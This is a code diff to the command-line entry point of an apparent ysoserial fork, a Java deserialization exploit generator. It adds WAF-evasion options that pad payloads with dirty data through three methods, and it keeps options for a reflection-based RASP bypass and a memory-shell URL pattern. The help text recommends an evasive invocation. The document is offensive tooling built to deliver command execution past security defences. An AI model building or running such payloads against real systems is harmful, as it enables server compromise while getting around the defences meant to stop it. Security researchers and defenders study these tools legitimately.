@@ -30,7 +30,8 @@ public class GeneratePayload {
 		Options options = new Options();
 		options.addOption("g", "gadget", true, "Java deserialization gadget");
 		options.addOption("p", "parameters", true, "Gadget parameters");
-		options.addOption("d", "dirty", true, "Using dirty data to bypass WAF");
+		options.addOption("dt", "dirty-type", true, "Using dirty data to bypass WAF，type: 1:Random Hashable Collections/2:LinkedList Nesting/3:TC_RESET in Serialized Data");
+		options.addOption("dl", "dirty-length", true, "Length of dirty data when using type 1 or 3/Counts of Nesting loops when using type 2");
 		options.addOption("o", "obscure", false, "Using reflection to bypass RASP");
 		options.addOption("i", "inherit", false, "Make payload inherit AbstractTranslet or not");
 		options.addOption("u", "url", true, "MemoryShell binding url pattern,default [/su18]");
@@ -84,10 +85,11 @@ public class GeneratePayload {
 			ObjectPayload payload = payloadClass.newInstance();
 			Object        object  = payload.getObject(command);
 
-			// 是否指定混淆
-			if (cmdLine.hasOption("dirty")) {
-				int length = Integer.parseInt(cmdLine.getOptionValue("dirty"));
-				object = new DirtyDataWrapper(object, length).doWrap();
+			// 是否指定混淆，
+			if (cmdLine.hasOption("dirty-type") && cmdLine.hasOption("dirty-length")) {
+				int type   = Integer.parseInt(cmdLine.getOptionValue("dirty-type"));
+				int length = Integer.parseInt(cmdLine.getOptionValue("dirty-length"));
+				object = new DirtyDataWrapper(object, type, length).doWrap();
 			}
 
 
@@ -148,7 +150,7 @@ public class GeneratePayload {
 		System.err.println("\r\n");
 		new HelpFormatter().printHelp("ysoserial-[version]-su18-all.jar", options, true);
 		System.err.println("\r\n");
-		System.err.println("Recommended Usage: -g [payload] -p '[command]' -d 50000 -o -i");
+		System.err.println("Recommended Usage: -g [payload] -p '[command]' -dt 1 -dl 50000 -o -i");
 		System.err.println("If you want your payload being extremely short，you could just use:");
 		System.err.println("java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]'");
 
